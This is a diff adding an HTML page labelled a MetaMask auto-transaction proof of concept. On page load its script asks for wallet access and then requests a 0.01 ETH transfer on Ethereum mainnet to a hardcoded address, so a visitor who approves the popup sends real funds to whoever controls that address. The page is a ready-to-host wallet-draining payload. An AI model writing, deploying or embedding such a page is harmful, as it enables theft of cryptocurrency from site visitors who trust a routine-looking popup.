@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>MetaMask Auto TX PoC</title>
+  </head>
+  <body>
+    <h1>Testing Auto MetaMask Transaction</h1>
+    <p>If MetaMask is installed and unlocked, a transaction popup will appear automatically.</p>
+
+    <script>
+      window.addEventListener("DOMContentLoaded", async () => {
+        if (typeof window.ethereum !== "undefined") {
+          try {
+            // Request wallet access
+            await ethereum.request({ method: 'eth_requestAccounts' });
+
+            // Send test transaction (0.01 ETH)
+            const tx = await ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: ethereum.selectedAddress,
+                to: '0xE358B02A5d75358e8A2fFa00407c1f6d6b817faE',
+                value: '0x2386F26FC10000', // 0.01 ETH
+                chainId: '0x1' // Mainnet
+              }]
+            });
+
+            console.log("Transaction sent:", tx);
+          } catch (err) {
+            console.error("Error:", err.message);
+          }
+        } else {
+          alert("MetaMask not detected.");
+        }
+      });
+    </script>
+  </body>
+</html>
